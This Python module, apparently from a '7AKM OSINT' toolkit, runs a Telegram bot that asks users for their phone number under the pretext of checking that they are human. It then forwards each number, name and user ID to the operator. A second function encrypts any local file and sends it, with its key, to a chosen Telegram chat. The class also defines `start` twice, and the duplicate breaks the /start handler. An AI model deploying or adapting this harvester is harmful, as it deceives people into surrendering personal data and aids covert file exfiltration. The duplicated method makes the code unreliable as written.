#!/usr/bin/env python3
"""
Telegram Bot Module for 7AKM OSINT
- Collects phone numbers from users and forwards to owner
- Send encrypted files to Telegram using user-provided token and chat ID
"""

import asyncio
import threading
import logging
import os
import tempfile
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, Document
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler
from colorama import Fore, Style
import base64
from cryptography.fernet import Fernet

# إعداد التسجيل (إخفاء معظم الرسائل)
logging.basicConfig(level=logging.ERROR)

# حالات المحادثة لجمع الأرقام
ASK_PHONE = 1

class TelegramBot:
    def __init__(self, token, owner_chat_id):
        self.token = token
        self.owner_chat_id = owner_chat_id
        self.app = None
        self.loop = None
        self.thread = None
        self.running = False

    async def start(self, update: Update, context):
        """بداية المحادثة: طلب مشاركة رقم الهاتف"""
        contact_keyboard = KeyboardButton(text="📱 مشاركة رقم الهاتف", request_contact=True)
        reply_markup = ReplyKeyboardMarkup([[contact_keyboard]], resize_keyboard=True, one_time_keyboard=True)
        await update.message.reply_text(
            "مرحباً! للتحقق من أنك مستخدم حقيقي، يرجى مشاركة رقم هاتفك عبر الزر أدناه.",
            reply_markup=reply_markup
        )
        return ASK_PHONE

    async def handle_contact(self, update: Update, context):
        """استقبال رقم الهاتف وإرساله للمالك"""
        contact = update.message.contact
        user = update.effective_user

        if contact:
            phone = contact.phone_number
            user_info = (
                f"الاسم: {user.first_name} {user.last_name or ''}\n"
                f"اليوزر: @{user.username or 'لا يوجد'}\n"
                f"المعرف: {user.id}"
            )
            # إرسال الرقم إلى المالك
            await context.bot.send_message(
                chat_id=self.owner_chat_id,
                text=f"📞 **رقم هاتف جديد**\n\n{user_info}\nرقم الهاتف: `{phone}`"
            )
            # إشعار المستخدم
            await update.message.reply_text("✅ تم استلام رقمك،  البوت تم انشائه من اداه 7AKM OSINT ")
        else:
            await update.message.reply_text("❌ حدث خطأ في استلام الرقم.")

        # إنهاء المحادثة
        return ConversationHandler.END

    async def cancel(self, update: Update, context):
        """إلغاء العملية"""
        await update.message.reply_text("تم الإلغاء.")
        return ConversationHandler.END

    async def handle_text(self, update: Update, context):
        """الرد على الرسائل النصية العادية"""
        await update.message.reply_text("الرجاء استخدام /start للبدء.")

    async def build_app(self):
        """بناء تطبيق البوت وإضافة المعالجات"""
        self.app = Application.builder().token(self.token).build()
        conv_handler = ConversationHandler(
            entry_points=[CommandHandler("start", self.start)],
            states={
                ASK_PHONE: [MessageHandler(filters.CONTACT, self.handle_contact)],
            },
            fallbacks=[CommandHandler("cancel", self.cancel)],
        )
        self.app.add_handler(conv_handler)
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text))
        return self.app

    def run_bot(self):
        """تشغيل البوت في حلقة الأحداث"""
        asyncio.set_event_loop(self.loop)
        self.loop.run_until_complete(self.build_app())
        self.app.run_polling()

    def start(self):
        """بدء البوت في خيط منفصل"""
        self.running = True
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self.run_bot, daemon=True)
        self.thread.start()
        print(Fore.GREEN + "[+] Telegram bot started. Waiting for users..." + Style.RESET_ALL)

    def stop(self):
        """إيقاف البوت بأمان"""
        if self.app and self.running:
            asyncio.run_coroutine_threadsafe(self.app.stop(), self.loop)
            self.running = False
            print(Fore.YELLOW + "[*] Bot stopped." + Style.RESET_ALL)

def send_encrypted_file():
    """إرسال ملف مشفر إلى تليجرام باستخدام التوكن والايدي الذي يدخله المستخدم"""
    print(Fore.YELLOW + "[*] Send Encrypted File to Telegram" + Style.RESET_ALL)
    print(Fore.RED + "⚠️  The file will be encrypted and sent to the specified chat." + Style.RESET_ALL)

    # إدخال التوكن ومعرف الدردشة
    token = input(Fore.MAGENTA + "Enter your bot token: " + Style.RESET_ALL).strip()
    if not token:
        print(Fore.RED + "❌ Token is required.")
        return

    try:
        chat_id = int(input(Fore.MAGENTA + "Enter chat ID to send to: " + Style.RESET_ALL).strip())
    except ValueError:
        print(Fore.RED + "❌ Invalid chat ID.")
        return

    # إدخال مسار الملف
    file_path = input(Fore.MAGENTA + "Enter path to file: " + Style.RESET_ALL).strip()
    if not os.path.exists(file_path):
        print(Fore.RED + "❌ File not found.")
        return

    # توليد مفتاح تشفير
    key = Fernet.generate_key()
    fernet = Fernet(key)

    # قراءة الملف وتشفيره
    with open(file_path, 'rb') as f:
        file_data = f.read()
    encrypted_data = fernet.encrypt(file_data)

    # حفظ الملف المشفر مؤقتاً
    encrypted_filename = os.path.basename(file_path) + ".encrypted"
    temp_dir = tempfile.gettempdir()
    encrypted_path = os.path.join(temp_dir, encrypted_filename)
    with open(encrypted_path, 'wb') as f:
        f.write(encrypted_data)

    # إرسال الملف المشفر إلى تليجرام
    import requests
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    with open(encrypted_path, 'rb') as f:
        files = {'document': (encrypted_filename, f, 'application/octet-stream')}
        data = {'chat_id': chat_id}
        response = requests.post(url, files=files, data=data)

    # حذف الملف المؤقت
    os.remove(encrypted_path)

    if response.status_code == 200:
        print(Fore.GREEN + "[+] File sent successfully!" + Style.RESET_ALL)
        # إرسال المفتاح كرسالة نصية
        key_b64 = base64.b64encode(key).decode()
        message = f"🔑 **Encryption Key** (base64):\n`{key_b64}`\n\nUse this key to decrypt the file."
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", json={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'})
        print(Fore.GREEN + "[+] Encryption key sent separately." + Style.RESET_ALL)
    else:
        print(Fore.RED + f"[-] Failed to send file: {response.text}" + Style.RESET_ALL)

def main():
    print(Fore.YELLOW + "[*] Telegram Bot Module" + Style.RESET_ALL)
    print(Fore.CYAN + "Choose an option:")
    print("1. Run phone number collector bot")
    print("2. Send encrypted file to Telegram")
    choice = input(Fore.MAGENTA + "Enter choice (1/2): " + Style.RESET_ALL).strip()

    if choice == "1":
        token = input(Fore.MAGENTA + "Enter your bot token: " + Style.RESET_ALL).strip()
        if not token:
            print(Fore.RED + "❌ Token is required.")
            return
        try:
            owner_id = int(input(Fore.MAGENTA + "Enter your Telegram chat ID (owner): " + Style.RESET_ALL).strip())
        except ValueError:
            print(Fore.RED + "❌ Invalid chat ID.")
            return
        bot = TelegramBot(token, owner_id)
        bot.start()
        print(Fore.CYAN + "\nBot is running. Press Enter to stop it and return to menu." + Style.RESET_ALL)
        input()
        bot.stop()
    elif choice == "2":
        send_encrypted_file()
    else:
        print(Fore.RED + "Invalid choice.")

if __name__ == "__main__":
    main()
